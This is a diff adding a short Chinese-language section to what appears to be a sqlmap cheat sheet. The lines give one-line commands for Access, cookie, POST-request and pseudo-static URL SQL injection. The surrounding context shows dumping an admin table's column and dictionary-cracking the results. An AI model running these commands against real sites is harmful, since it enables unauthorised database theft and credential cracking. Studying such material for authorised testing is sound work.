@@ -18,6 +18,17 @@
     sqlmap.py -u "URL" -D sqlinject  -T admin -C 字段 --dump  --dump:导出列里面的字段
     然后回车默认通过字典来破解，选择1利用自带的字典暴力破解
 ```
+###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 其他总结
+
+```python
+    1.ACCESS注入:sqlmap.py -u www.xxx.asp?id=7" --tables
+    2.cookie注入: sqlmap.py -u www.xxx.asp.asp --cookie "id=31" --table --level 2
+    3.post注入: sqlmap.py -r 抓包数据.txt --dbs
+    4.伪静态注入: sqlmap.py -u www.xxx.com/xxx*.html -D 数据库 --tables
+```
+
+
+
 
 
 
